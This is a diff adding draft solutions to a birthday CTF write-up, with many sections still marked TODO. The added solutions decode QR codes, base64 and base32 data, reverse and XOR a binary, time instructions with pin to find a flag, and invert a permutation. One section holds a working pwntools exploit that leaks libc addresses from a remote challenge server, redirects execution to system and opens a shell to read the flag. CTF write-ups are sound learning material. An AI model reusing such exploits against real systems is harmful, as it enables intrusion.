@@ -315,6 +315,13 @@ Flag: BDayCTF{r34dy_f0r_4n07h3r_l4p_4r0und_7h3_5un}
 
 ## [avlidienbrunn's Challenge](https://twitter.com/avlidienbrunn/status/1250046160603144193)
 
+> congratulations for leveling up! You might be a stellar haxor but can you crack basing 64 encryption?? zeta.alieni.se
+
+TODO
+
+
+
+
 Flag: BDayCTF{at least basing 64 has support for space}
 
 ## [likvidera's Challenge](https://twitter.com/likvidera/status/1250046386470555648)
@@ -327,30 +334,281 @@ Flag: BDayCTF{:eggplant:+:eggplant:+:eggplant:}
 
 ## [Bill's Challenge](https://twitter.com/noteyler/status/1250046144505212928)
 
+TODO
+
+{% highlight bash %}
+$ zbarimg challenge.png
+QR-Code:SUpLSE1aM1BNVkhVSVJTRkdCSEZJN0xCUE5QVEFaTEJINTRXUVlMRUw1S0Q2UTJCTDVQVlU1Wjc=
+scanned 1 barcode symbols from 1 images in 0.03 seconds
+
+$ base64 -D challenge.b64 > challenge.b32
+$ base32 -d challenge.b32
+BTvgoeODFE0NT}a{_0ea?yhad_T?CA__Zw?
+{% endhighlight %}
+
+TODO
+
+```
+BTvgoeO  
+DFE0NT}  
+a{_0ea?  
+yhad_T?  
+CA__Zw?  
+```
+
+TODO
+
+```
+BDayCTF{hAvE_a_g00d_oNe_ZeTaTwO}???
+```
+
 Flag: BDayCTF{hAvE_a_g00d_oNe_ZeTaTwO}
 
 ## [bootplug's Challenge](https://twitter.com/bootplug_ctf/status/1250046146262773768)
+
+TODO
+
+{% highlight python %}
+#!/usr/bin/env python3
+
+from pwn import *
+import string
+
+def attempt(flag):
+    r = process(['/home/zetatwo/tools/pin/pin', '-t', '/home/zetatwo/tools/pin/source/tools/ManualExamples/obj-intel64/inscount0.so', '--', './main'], level='warn')
+    r.sendline(flag)
+    r.wait()
+    r.close()
+    with open('inscount.out', 'r') as fin:
+        try:
+            count_data = fin.read()
+            return int(count_data.replace('Count ', '').strip())
+        except ValueError as e:
+            print(c, count_data)
+            print(e)
+            return 0
+
+
+flag = ''
+with log.progress('Finding flag') as p:
+    while len(flag) == 0 or flag[-1] != '}':
+        best_count = 0
+        best_char = None
+        for c in string.printable:
+            cand_flag = flag + c
+            cand_count = attempt(cand_flag)
+            p.status(cand_flag + ' (%d/%d)' % (cand_count, best_count))
+            if cand_count > best_count:
+                best_count = cand_count
+                best_char = c
+
+        flag += best_char
+
+    p.success(flag)
+{% endhighlight %}
+
+TODO
 
 Flag: BDayCTF{keep_up_the_good_work!_love_from_bootplug<3}
 
 ## [OverTheWire's Challenge](https://twitter.com/OverTheWireCTF/status/1250046146996834304)
 
+TODO
+
+{% highlight bash %}
+$ barimg challenge.png
+QR-Code:https://0bin.net/paste/UcHkL9geQykAXG+K#qTRFMjBAO4hBzW5DAJfObnULhggtjNWrM9XEYf4dsO1
+scanned 1 barcode symbols from 1 images in 0.13 seconds
+{% endhighlight %}
+
+TODO
+DECODE, DECOMPRESS AND REVERSE ME:
+
+{% highlight bash %}
+$ file challenge.dat
+challenge.dat: gzip compressed data, last modified: Tue Apr 14 02:24:30 2020, from Unix, original size 7240
+$ mv challenge.dat challenge.gz
+$ gunzip challenge.gz
+gzip: challenge: Value too large for defined data type
+$ file challenge
+challenge: data
+$ python3 -c 'import sys; sys.stdout.buffer.write(bytes.fromhex(sys.stdin.buffer.read().hex()[::-1]))' < challenge > challenge.rev
+$ file challenge.rev
+challenge.rev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=2dfad91c5734e16faffb7034b09fb9ebdbdecee7, not stripped
+{% endhighlight %}
+
+TODO
+
+{% highlight python %}
+#!/usr/bin/env python3
+
+with open('challenge.rev', 'rb') as fin:
+    fin.seek(0x768)
+    data = fin.read(38)
+
+decrypted = bytes(x^y for x,y in zip(data,data[1:])).decode('ascii')
+print(decrypted)
+{% endhighlight %}
+
+TODO
+
+
 Flag: DayCTF{sTiLl_g0T_iT_1N_y0Ur_0Ld_4G3!}
 
 ## [watevr's Challenge](https://twitter.com/watevr_team/status/1250046548144205824)
+
+> We hope that you have had a glorious birthday, we from watevr wanted to celebrate your birthday with a few challenges, good luck https://watevr.xyz/cake.txt
+
+TODO
+
+{% highlight javscript %}
+m=[139,72,39,121,82,202,79,58,106,160,241,249,182,253,135,124,70,85,211,84,164,175,79,163,153,215,67,190,183,108,30,216,39,116,93,119,33,201,131,239,230,42,104,243,209,220,171,11,236,155,248,82,85,55,171,144,233,177,125,166,204,206,248,100,11,25,178,209,43,109,173,102,78,245,231,62,185,216,67,241,108,192,133,107,151,41,5,177,7,221,244,37,171,213,231,64,128,81,7,170,120,12,29,83,56,217,207,197,135,83,78,222,243,25,110,217,169,39,133,105,157,88,227,107,11,95,88,143,50,141,246,104,150,121,209,122,170,192,136,27,247,136,203,154,22,62,142,50,145,87,52,199,102,112,100,95,91,200,210,206,174,85,233,120,5,185,82,225,12,92,66,192,160,114,134,247,16,176,253,230,8,191,239,197,174,173,62,153,147,191,147,154,172,171,19,139,87,134,93,182,198,76,189,236,186,220,190,73,7,125,116,118,36,93,52,101,242,24,214,128,115,133,6,8,157,129,185,126,47,39,173,230,87,67,80,53,197,63,236,134,157,73,196,249,48,112,35,239,231,50,212,97,177,201,222,92,41,199,130,231,21,223,206,27,183,116,233,144,174,244,243,40,80,94,241,239,212,12,239,49,105,64,222,145,132,169,223,52,75,99,144]
+
+     ! ! ! ! ! !
+    ~-~-~-~-~-~-~
+    "   Happy   ",
+    " Birthday! ",
+//==================\\
+a=255,x=(k,d)=>(i=j=f=
+0,s=[...Array(a).keys(
+)],s.forEach((_,i)=>(f
+=f+s[i]+k[i%k.length]&
+a,[s[i],s[f]]=[s[f],s[
+i]])),d.map(y=>(i=i+1&
+a,j=j+s[i]&a,[s[i],s[j
+]]=[s[j],s[i]],y^s[s[i
+]+s[j]&a]))),l="Upvhi\
+!mvdl-!usz!bhbjo!ofyu\
+!zfbs",r=Math.random,c
+=c=>c.charCodeAt(),k=[
+r(),r(),r()].map(b=>b*
+a|0),r=x(k,m),s=String
+.fromCharCode,r=s(...r
+),r.startsWith("ZETA")
+?r.slice(4):s(...[...l
+].map(a=>a.charCodeAt(
+)-1))/////////////////
+{% endhighlight %}
+
+TODO
+
+```
+Grattis på 33 års dagen Calle, du verkar ha dina skills i behåll trots din ålder,
+du har löst del 1 av våra challs,
+här har du lokes chall: :?ABCDEFGHI;J5KLMNOPQRSTUVWXYZ[\3) $!7&]1/^_`ab>+cde%fghi4jklmn-o".p29qr(,stuvw=*x0y8z{<|#6'}@
+och här är nnewrams chall: https://watevr.xyz/zeta.c
+```
 
 Flag: "Grattis på 33 års dagen Calle, du verkar ha dina skills i behåll trots din ålder"
 
 ## nnewram's Challenge
 
 URL: https://watevr.xyz/zeta.c  
+
+TODO
+
+{% highlight python %}
+#!/usr/bin/env python3
+
+from pwn import *
+
+HOST = '83.209.18.82'
+PORT = 1337
+
+#HOST = 'localhost'
+#PORT = 31337
+
+r = remote(HOST, PORT)
+libc = ELF('./libc.remote.so.6')
+
+r.recvuntil('cka: ')
+rtld_global_addr = int(r.recvline().strip().decode('ascii'))
+log.info('Leak: %#014x', rtld_global_addr)
+
+libc_addr_ptr = rtld_global_addr - 72
+# $rip = *(_rtld_global + 3840)
+# $rdi = _rtld_global+2312
+rtld_offset = (3840 - 2312)//8
+
+r.recvuntil('cka: ')
+r.sendline(str(libc_addr_ptr))
+
+r.recvuntil('fel address: ')
+
+libc_ptr = int(r.recvline().decode('ascii').strip())
+libc_base = libc_ptr - 1471088
+
+log.info('Inside libc: %#016x', libc_ptr)
+log.info('Libc base: %#016x', libc_base)
+
+pause()
+
+r.recvuntil('du vill skriva till: ')
+r.sendline(str(rtld_global_addr + 3840))
+
+r.recvuntil('rde: ')
+r.sendline(str(libc_base + libc.symbols['system']))
+
+r.recvuntil('r /bin/sh: ')
+r.sendline(str(rtld_offset))
+
+r.interactive()
+{% endhighlight %}
+
+TODO
+
+{% highlight bash %}
+$ python3 solve.py
+[+] Opening connection to 83.209.18.82 on port 1337: Done
+[*] '/mnt/hgfs/Dropbox/ITsec/ctf/bday2020/nnewram/libc.remote.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Leak: 0x7fd08e4f4060
+[*] Inside libc: 0x007fd08e042270
+[*] Libc base: 0x007fd08dedb000
+[*] Paused (press any to continue)
+[*] Switching to interactive mode
+$ cat /home/ctf/flag.txt
+BDayCTF{gr4771s_på_föd3ls3d4g3n_Z3t4_från_w4t3vr_@nnewram}
+{% endhighlight %}
+
+TODO
+
 Flag: BDayCTF{gr4771s_på_föd3ls3d4g3n_Z3t4_från_w4t3vr_@nnewram}
 
 ## Loke's Challenge
 
 Data: 
 
+TODO
+
 ```:?ABCDEFGHI;J5KLMNOPQRSTUVWXYZ[\3) $!7&]1/^_`ab>+cde%fghi4jklmn-o".p29qr(,stuvw=*x0y8z{<|#6'}@```  
+
+{% highlight python %}
+#!/usr/bin/env python3
+
+from permutation import Permutation
+
+text = ":?ABCDEFGHI;J5KLMNOPQRSTUVWXYZ[\\3) $!7&]1/^_`ab>+cde%fghi4jklmn-o\".p29qr(,stuvw=*x0y8z{<|#6'}@"
+print(text)
+assert len(text) == len(set(text))
+numbers = [ord(x)-ord(' ')+1 for x in text]
+assert set(numbers) == set(range(1,94+1))
+
+p = Permutation(*numbers)
+print(''.join([chr(ord(' ')+x-1) for x in p.inverse().to_image()]))
+{% endhighlight %}
+
+TODO
+
+```
+BDayCTF{hApPi_bIrHd@Y-zEte +woO!} "#$%&'()*,./0123456789:;<=>?GJKLMNQRSUVWXZ[\]^`cfgjklmnqsuvx|
+```
+
+TODO
 
 Flag: BDayCTF{hApPi_bIrHd@Y-zEte +woO!}
 
